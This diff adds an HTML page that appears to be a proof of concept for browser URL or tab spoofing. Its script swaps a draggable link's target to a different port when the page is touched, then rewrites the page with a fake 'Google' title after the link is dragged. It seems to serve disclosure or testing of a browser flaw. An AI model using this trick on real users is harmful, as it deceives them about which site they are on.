@@ -1,0 +1,19 @@
+<script>
+    document.addEventListener("dragend", function () {
+        document.write('<b>Spoofing</b>');
+        document.write('<title>Google</title>');
+    });
+
+    function ee() {
+        document.getElementById('bb').setAttribute('href', 'https://www.google.com:9999');
+    }
+
+    document.addEventListener('touchstart', function (e) {
+        ee();
+    });
+</script>
+
+<p>
+    Drag and drop links to the current TAB.
+</p>
+<a id='bb' href="https://www.google.com/" draggable="true">www.google.com</a>
